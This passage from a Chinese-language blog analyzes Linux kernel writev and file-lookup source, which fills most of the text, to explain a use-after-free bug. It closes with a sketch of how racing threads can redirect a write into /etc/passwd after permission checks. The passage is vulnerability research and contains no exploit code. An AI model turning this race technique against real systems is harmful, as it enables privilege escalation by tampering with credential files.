/>    f-&gt;f_path.mnt = NULL;<br />    f-&gt;f_path.dentry = NULL;<br />    f-&gt;f_inode = NULL;<br />    <span style="color: rgb(150, 203, 254);">return</span> error;<br />}</code></pre><h3>writev</h3><p>主要要分析的是 <code style="font-family: SFMono-Regular, Consolas, ;">sys_writev</code>。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">SYSCALL_DEFINE3(writev, <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span>, fd, <span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(150, 203, 254);">struct</span> iovec __user *, vec,<br />                <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span>, vlen)<br />{<br />    <span style="color: rgb(150, 203, 254);">return</span> do_writev(fd, vec, vlen, <span style="color: rgb(255, 115, 253);">0</span>);<br />}</code></pre><p>深入这个函数来看看</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">ssize_t</span> <span style="color: rgb(255, 255, 182);">do_writev</span>(<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span> fd, <span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(150, 203, 254);">struct</span> iovec __user *vec,<br />                         <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span> vlen, <span style="color: rgb(255, 255, 182);">rwf_t</span> flags)<br />{<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">fd</span> f = fdget_pos(fd);<br />    <span style="color: rgb(255, 255, 182);">ssize_t</span> ret = -EBADF;<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (f.file) {<br />        <span style="color: rgb(255, 255, 182);">loff_t</span> pos, *ppos = file_ppos(f.file);<br />        <span style="color: rgb(150, 203, 254);">if</span> (ppos) {<br />            pos = *ppos;<br />            ppos = &amp;pos;<br />        }<br />        ret = vfs_writev(f.file, vec, vlen, ppos, flags);<br />        <span style="color: rgb(150, 203, 254);">if</span> (ret &gt;= <span style="color: rgb(255, 115, 253);">0</span> &amp;&amp; ppos)<br />            f.file-&gt;f_pos = pos;<br />        fdput_pos(f);<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (ret &gt; <span style="color: rgb(255, 115, 253);">0</span>)<br />        add_wchar(current, ret);<br />    inc_syscw(current);<br />    <span style="color: rgb(150, 203, 254);">return</span> ret;<br />}</code></pre><p>看起来其实非常简单，也就是先根据文件描述符去获取 fd 结构，fd 结构里面维护了当前打开的文件的写指针和读指针，第一步先获取，然后调用 <code style="font-family: SFMono-Regular, Consolas, ;">vfs_writev</code> 去写该文件，随后释放文件结构，如果返回值 &gt;0，则增加当前文件写入字符数（<code style="font-family: SFMono-Regular, Consolas, ;">add_wchar</code>），增加当前系统调用次数（<code style="font-family: SFMono-Regular, Consolas, ;">inc_syscw</code>）</p><p>同样从头到尾来看看函数定义，首先是这个获取文件结构的 <code style="font-family: SFMono-Regular, Consolas, ;">fdget_pos</code>，</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(150, 203, 254);">inline</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">fd</span> fdget_pos(<span style="color: rgb(255, 255, 182);">int</span> fd)<br />{<br />    <span style="color: rgb(150, 203, 254);">return</span> __to_fd(__fdget_pos(fd));<br />}</code></pre><p>然后再深入看看 <code style="font-family: SFMono-Regular, Consolas, ;">__to_fd</code> 和 <code style="font-family: SFMono-Regular, Consolas, ;">__fget_pos</code> 函数。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(150, 203, 254);">inline</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">fd</span> __to_fd(<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span> v)<br />{<br />    <span style="color: rgb(150, 203, 254);">return</span> (<span style="color: rgb(150, 203, 254);">struct</span> fd){(<span style="color: rgb(150, 203, 254);">struct</span> file *)(v &amp; ~<span style="color: rgb(255, 115, 253);">3</span>),v &amp; <span style="color: rgb(255, 115, 253);">3</span>};<br />}</code></pre><p>无疑 <code style="font-family: SFMono-Regular, Consolas, ;">__to_fd</code> 函数将获得的文件结构 <code style="font-family: SFMono-Regular, Consolas, ;">struct file</code> 转为 <code style="font-family: SFMono-Regular, Consolas, ;">struct fd</code>。</p><p><code style="font-family: SFMono-Regular, Consolas, ;">__fdget_pos</code> 就应当是根据文件描述符来获取文件结构 <code style="font-family: SFMono-Regular, Consolas, ;">struct file</code>。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span> __fdget_pos(<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> fd)<br />{<br />    <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span> v = __fdget(fd);<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">file</span> *file = (<span style="color: rgb(150, 203, 254);">struct</span> file *)(v &amp; ~<span style="color: rgb(255, 115, 253);">3</span>);<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (file &amp;&amp; (file-&gt;f_mode &amp; FMODE_ATOMIC_POS)) {<br />        <span style="color: rgb(150, 203, 254);">if</span> (file_count(file) &gt; <span style="color: rgb(255, 115, 253);">1</span>) {<br />            v |= FDPUT_POS_UNLOCK;<br />            mutex_lock(&amp;file-&gt;f_pos_lock);<br />        }<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> v;<br />}</code></pre><p>深入下去 <code style="font-family: SFMono-Regular, Consolas, ;">__fdget</code> 可以发现里面调用了 <code style="font-family: SFMono-Regular, Consolas, ;">__fget_light</code>，第二个参数被固定为 <code style="font-family: SFMono-Regular, Consolas, ;">FMODE_PATH</code>，对于这个函数定义：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">/* File is opened with O_PATH; almost nothing can be done with it */</span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">define</span> FMODE_PATH                ((__force fmode_t)0x4000)</span><br /><span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span> __fdget(<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> fd)<br />{<br />        <span style="color: rgb(150, 203, 254);">return</span> __fget_light(fd, FMODE_PATH);<br />}<br /><span style="color: rgb(124, 124, 124);">/*<br /> * Lightweight file lookup - no refcnt increment if fd table isn't shared.<br /> *<br /> * You can use this instead of fget if you satisfy all of the following<br /> * conditions:<br /> * 1) You must call fput_light before exiting the syscall and returning control<br /> *    to userspace (i.e. you cannot remember the returned struct file * after<br /> *    returning to userspace).<br /> * 2) You must not call filp_close on the returned struct file * in between<br /> *    calls to fget_light and fput_light.<br /> * 3) You must not clone the current task in between the calls to fget_light<br /> *    and fput_light.<br /> *<br /> * The fput_needed flag returned by fget_light should be passed to the<br /> * corresponding fput_light.<br /> */</span><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span> __fget_light(<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> fd, <span style="color: rgb(255, 255, 182);">fmode_t</span> mask)<br />{<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">files_struct</span> *files = current-&gt;files;<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">file</span> *file;<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (atomic_read(&amp;files-&gt;count) == <span style="color: rgb(255, 115, 253);">1</span>) {<br />        file = files_lookup_fd_raw(files, fd);<br />        <span style="color: rgb(150, 203, 254);">if</span> (!file || unlikely(file-&gt;f_mode &amp; mask))<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />        <span style="color: rgb(150, 203, 254);">return</span> (<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span>)file;<br />    } <span style="color: rgb(150, 203, 254);">else</span> {<br />        file = __fget(fd, mask, <span style="color: rgb(255, 115, 253);">1</span>);<br />        <span style="color: rgb(150, 203, 254);">if</span> (!file)<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />        <span style="color: rgb(150, 203, 254);">return</span> FDPUT_FPUT | (<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span>)file;<br />    }<br />}<br /></code></pre><p>这里也解释了这个宏的定义，表示文件几乎不能做任何操作比如说 <code style="font-family: SFMono-Regular, Consolas, ;">READ,WRITE</code>，而这里的 <code style="font-family: SFMono-Regular, Consolas, ;">mask</code> 在后面分析是禁止的一些操作，比如文件具有 <code style="font-family: SFMono-Regular, Consolas, ;">READ</code> 权限但是 <code style="font-family: SFMono-Regular, Consolas, ;">mask</code> 被设置为 <code style="font-family: SFMono-Regular, Consolas, ;">FMODE_READ</code>，那么在后续的调用中会返回 <code style="font-family: SFMono-Regular, Consolas, ;">NULL</code>。</p><p>先获取当前进程的文件描述符表（<code style="font-family: SFMono-Regular, Consolas, ;">current-&gt;files</code>），然后判断文件描述符表的引用计数是否为 <code style="font-family: SFMono-Regular, Consolas, ;">1</code> （描述符表是否共享），如果是则调用 <code style="font-family: SFMono-Regular, Consolas, ;">files_lookup_fd_raw</code> 去获取文件结构指针，然后判断文件操作模式的正确性，随后返回。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">/*<br /> * The caller must ensure that fd table isn't shared or hold rcu or file lock<br /> */</span><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(150, 203, 254);">inline</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">file</span> *files_lookup_fd_raw(<span style="color: rgb(150, 203, 254);">struct</span> files_struct *files, <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> fd)<br />{<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">fdtable</span> *fdt = rcu_dereference_raw(files-&gt;fdt);<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (fd &lt; fdt-&gt;max_fds) {<br />        fd = array_index_nospec(fd, fdt-&gt;max_fds);<br />        <span style="color: rgb(150, 203, 254);">return</span> rcu_dereference_raw(fdt-&gt;fd[fd]);<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">NULL</span>;<br />}</code></pre><p>根据注释也可以认为，需要保证文件描述符表没有被共享过，或者是持有文件锁。会返回一个 <code style="font-family: SFMono-Regular, Consolas, ;">fd</code> 表中的 <code style="font-family: SFMono-Regular, Consolas, ;">struct file</code> 结构（<code style="font-family: SFMono-Regular, Consolas, ;">fdt-&gt;fd[fd]</code>）。</p><p>如果引用计数不为 <code style="font-family: SFMono-Regular, Consolas, ;">1</code>，则调用 <code style="font-family: SFMono-Regular, Consolas, ;">__fget</code> 去获取指针，其中主要是调用了 <code style="font-family: SFMono-Regular, Consolas, ;">__fget_files</code> 函数。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">define</span> get_file_rcu_many(x, cnt)        \<br />        atomic_long_add_unless(&amp;(x)-&gt;f_count, (cnt), 0)</span><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">file</span> *__fget_files(<span style="color: rgb(150, 203, 254);">struct</span> files_struct *files, <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> fd,<br />                                 <span style="color: rgb(255, 255, 182);">fmode_t</span> mask, <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> refs)<br />{<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">file</span> *file;<br />    rcu_read_lock();<br />loop:<br />    file = files_lookup_fd_rcu(files, fd);<br />    <span style="color: rgb(150, 203, 254);">if</span> (file) {<br />        <span style="color: rgb(124, 124, 124);">/* File object ref couldn't be taken.<br />                 * dup2() atomicity guarantee is the reason<br />                 * we loop to catch the new file (or NULL pointer)<br />                 */</span><br />        <span style="color: rgb(150, 203, 254);">if</span> (file-&gt;f_mode &amp; mask)<br />            file = <span style="color: rgb(198, 197, 254);">NULL</span>;<br />        <span style="color: rgb(150, 203, 254);">else</span> <span style="color: rgb(150, 203, 254);">if</span> (!get_file_rcu_many(file, refs))<br />            <span style="color: rgb(150, 203, 254);">goto</span> loop;<br />    }<br />    rcu_read_unlock();<br /><br />    <span style="color: rgb(150, 203, 254);">return</span> file;<br />}<br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(150, 203, 254);">inline</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">file</span> *__fget(<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> fd, <span style="color: rgb(255, 255, 182);">fmode_t</span> mask,<br />                                  <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> refs)<br />{<br />    <span style="color: rgb(150, 203, 254);">return</span> __fget_files(current-&gt;files, fd, mask, refs);<br />}<br /></code></pre><p>这里的 <code style="font-family: SFMono-Regular, Consolas, ;">files_lookup_fd_rcu</code> 直接可以认为是获取文件结构体的，随后判断里面是否包含禁止的模式，然后增加文件计数引用 （<code style="font-family: SFMono-Regular, Consolas, ;">get_file_rcu_many</code>）。</p><p>回过头来看看 <code style="font-family: SFMono-Regular, Consolas, ;">__fdget_pos</code> 函数</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span> __fdget_pos(<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> fd)<br />{<br />    <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span> v = __fdget(fd);<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">file</span> *file = (<span style="color: rgb(150, 203, 254);">struct</span> file *)(v &amp; ~<span style="color: rgb(255, 115, 253);">3</span>);<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (file &amp;&amp; (file-&gt;f_mode &amp; FMODE_ATOMIC_POS)) {<br />        <span style="color: rgb(150, 203, 254);">if</span> (file_count(file) &gt; <span style="color: rgb(255, 115, 253);">1</span>) {<br />            v |= FDPUT_POS_UNLOCK;<br />            mutex_lock(&amp;file-&gt;f_pos_lock);<br />        }<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> v;<br />}</code></pre><p>获取到的文件指针将最低两位置为 0（对齐），如果被设置了 <code style="font-family: SFMono-Regular, Consolas, ;">FMODE_ATOMIC_POS</code> 且 文件引用大于 1，那么上锁，到这里，才分析完 <code style="font-family: SFMono-Regular, Consolas, ;">do_writev</code> 的第一句话，来看看接下来的语句，重点是 <code style="font-family: SFMono-Regular, Consolas, ;">vfs_writev</code> 函数。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">ssize_t</span> <span style="color: rgb(255, 255, 182);">do_iter_write</span>(<span style="color: rgb(150, 203, 254);">struct</span> file *file, <span style="color: rgb(150, 203, 254);">struct</span> iov_iter *iter,<br />                <span style="color: rgb(255, 255, 182);">loff_t</span> *pos, <span style="color: rgb(255, 255, 182);">rwf_t</span> flags)<br />{<br />        <span style="color: rgb(255, 255, 182);">size_t</span> tot_len;<br />        <span style="color: rgb(255, 255, 182);">ssize_t</span> ret = <span style="color: rgb(255, 115, 253);">0</span>;<br /><br />        <span style="color: rgb(150, 203, 254);">if</span> (!(file-&gt;f_mode &amp; FMODE_WRITE))<br />                <span style="color: rgb(150, 203, 254);">return</span> -EBADF;<br />        <span style="color: rgb(150, 203, 254);">if</span> (!(file-&gt;f_mode &amp; FMODE_CAN_WRITE))<br />                <span style="color: rgb(150, 203, 254);">return</span> -EINVAL;<br /><br />        tot_len = iov_iter_count(iter);<br />        <span style="color: rgb(150, 203, 254);">if</span> (!tot_len)<br />                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />        ret = rw_verify_area(WRITE, file, pos, tot_len);<br />        <span style="color: rgb(150, 203, 254);">if</span> (ret &lt; <span style="color: rgb(255, 115, 253);">0</span>)<br />                <span style="color: rgb(150, 203, 254);">return</span> ret;<br /><br />        <span style="color: rgb(150, 203, 254);">if</span> (file-&gt;f_op-&gt;write_iter)<br />                ret = do_iter_readv_writev(file, iter, pos, WRITE, flags);<br />        <span style="color: rgb(150, 203, 254);">else</span><br />                ret = do_loop_readv_writev(file, iter, pos, WRITE, flags);<br />        <span style="color: rgb(150, 203, 254);">if</span> (ret &gt; <span style="color: rgb(255, 115, 253);">0</span>)<br />                fsnotify_modify(file);<br />        <span style="color: rgb(150, 203, 254);">return</span> ret;<br />}<br /><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">ssize_t</span> <span style="color: rgb(255, 255, 182);">vfs_writev</span>(<span style="color: rgb(150, 203, 254);">struct</span> file *file, <span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(150, 203, 254);">struct</span> iovec __user *vec,<br />                          <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span> vlen, <span style="color: rgb(255, 255, 182);">loff_t</span> *pos, <span style="color: rgb(255, 255, 182);">rwf_t</span> flags)<br />{<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">iovec</span> iovstack[UIO_FASTIOV];<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">iovec</span> *iov = iovstack;<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">iov_iter</span> iter;<br />    <span style="color: rgb(255, 255, 182);">ssize_t</span> ret;<br /><br />    ret = import_iovec(WRITE, vec, vlen, ARRAY_SIZE(iovstack), &amp;iov, &amp;iter);<br />    <span style="color: rgb(150, 203, 254);">if</span> (ret &gt;= <span style="color: rgb(255, 115, 253);">0</span>) {<br />        file_start_write(file);<br />        ret = do_iter_write(file, &amp;iter, pos, flags);<br />        file_end_write(file);<br />        kfree(iov);<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> ret;<br />}</code></pre><p>首先根据 <code style="font-family: SFMono-Regular, Consolas, ;">writev</code> 的结构体解出数据和长度，然后调用 <code style="font-family: SFMono-Regular, Consolas, ;">do_iter_write</code> 去写文件，而在 <code style="font-family: SFMono-Regular, Consolas, ;">do_iter_write</code> 中可以发现，这里作权限校验了，校验了是否可写以及文件描述符是否可写，这里的两层意思分别是文件本身是否具有可写权限以及你打开的文件描述符是否包含了 <code style="font-family: SFMono-Regular, Consolas, ;">O_WRITE</code> 权限位。</p><p>随后进行写，写的过程会根据文件系统调用对应的写函数（<code style="font-family: SFMono-Regular, Consolas, ;">write_iter</code>）</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(150, 203, 254);">inline</span> <span style="color: rgb(255, 255, 182);">ssize_t</span> <span style="color: rgb(255, 255, 182);">call_write_iter</span>(<span style="color: rgb(150, 203, 254);">struct</span> file *file, <span style="color: rgb(150, 203, 254);">struct</span> kiocb *kio,<br />                                      <span style="color: rgb(150, 203, 254);">struct</span> iov_iter *iter)<br />{<br />    <span style="color: rgb(150, 203, 254);">return</span> file-&gt;f_op-&gt;write_iter(kio, iter);<br />}</code></pre><p>下面是完整的调用链，感兴趣可以跟一下。</p><p>do_writev-&gt;vfs_writev-&gt;do_iter_write-&gt;do_iter_readv_writev-&gt;call_write_iter-&gt;.write_iter -&gt; ext4_file_write_iter -&gt; ext4_buffered_write_iter</p><p>在这个函数里面可以看到我注释的两个位置分别对文件节点进行了上锁和解锁。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">static</span> ssize_t<br />    <span style="color: rgb(255, 255, 182);">ext4_file_write_iter</span>(<span style="color: rgb(150, 203, 254);">struct</span> kiocb *iocb, <span style="color: rgb(150, 203, 254);">struct</span> iov_iter *<span style="color: rgb(150, 203, 254);">from</span>)<br />{<br />    <span style="color: rgb(150, 203, 254);">struct</span> inode *inode = file_inode(iocb-&gt;ki_filp);<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (unlikely(ext4_forced_shutdown(EXT4_SB(inode-&gt;i_sb))))<br />        <span style="color: rgb(150, 203, 254);">return</span> -EIO;<br /><br /><span style="color: rgb(124, 124, 124);">#ifdef CONFIG_FS_DAX</span><br />    <span style="color: rgb(150, 203, 254);">if</span> (IS_DAX(inode))<br />        <span style="color: rgb(150, 203, 254);">return</span> ext4_dax_write_iter(iocb, <span style="color: rgb(150, 203, 254);">from</span>);<br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">endif</span></span><br />    <span style="color: rgb(150, 203, 254);">if</span> (iocb-&gt;ki_flags &amp; IOCB_DIRECT)<br />        <span style="color: rgb(150, 203, 254);">return</span> ext4_dio_write_iter(iocb, <span style="color: rgb(150, 203, 254);">from</span>);<br />    <span style="color: rgb(150, 203, 254);">else</span><br />        <span style="color: rgb(150, 203, 254);">return</span> ext4_buffered_write_iter(iocb, <span style="color: rgb(150, 203, 254);">from</span>);<br />}<br /><span style="color: rgb(150, 203, 254);">static</span> ssize_t <span style="color: rgb(255, 255, 182);">ext4_buffered_write_iter</span>(<span style="color: rgb(150, 203, 254);">struct</span> kiocb *iocb,<br />                                        <span style="color: rgb(150, 203, 254);">struct</span> iov_iter *<span style="color: rgb(150, 203, 254);">from</span>)<br />{<br />    ssize_t ret;<br />    <span style="color: rgb(150, 203, 254);">struct</span> inode *inode = file_inode(iocb-&gt;ki_filp);<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (iocb-&gt;ki_flags &amp; IOCB_NOWAIT)<br />        <span style="color: rgb(150, 203, 254);">return</span> -EOPNOTSUPP;<br /><br />    ext4_fc_start_update(inode);<br />    inode_lock(inode);<span style="color: rgb(124, 124, 124);">//这里会上锁</span><br />    ret = ext4_write_checks(iocb, <span style="color: rgb(150, 203, 254);">from</span>);<br />    <span style="color: rgb(150, 203, 254);">if</span> (ret &lt;= <span style="color: rgb(255, 115, 253);">0</span>)<br />        <span style="color: rgb(150, 203, 254);">goto</span> <span style="color: rgb(150, 203, 254);">out</span>;<br /><br />    current-&gt;backing_dev_info = inode_to_bdi(inode);<br />    ret = generic_perform_write(iocb-&gt;ki_filp, <span style="color: rgb(150, 203, 254);">from</span>, iocb-&gt;ki_pos);<br />    current-&gt;backing_dev_info = NULL;<br /><br />    <span style="color: rgb(150, 203, 254);">out</span>:<br />    inode_unlock(inode);<span style="color: rgb(124, 124, 124);">//这里会解锁</span><br />    ext4_fc_stop_update(inode);<br />    <span style="color: rgb(150, 203, 254);">if</span> (likely(ret &gt; <span style="color: rgb(255, 115, 253);">0</span>)) {<br />        iocb-&gt;ki_pos += ret;<br />        ret = generic_write_sync(iocb, ret);<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">return</span> ret;<br />}</code></pre><p>此时两个线程会卡在这个锁里，翻一翻时间节点，此时权限校验已经完了，第一个线程写入大量数据将第二个线程获取锁的时间，趁此机会第三个线程将 <code style="font-family: SFMono-Regular, Consolas, ;">/etc/passwd</code> 打开并将文件页面以这个 <code style="font-family: SFMono-Regular, Consolas, ;">uaf</code> 的页面使用，第二个线程获取锁之后直接将数据写入 <code style="font-family: SFMono-Regular, Consolas, ;">/etc/passwd</code>。</p><p>所以要彻底明白这个漏洞，还需要理解前面 UAF 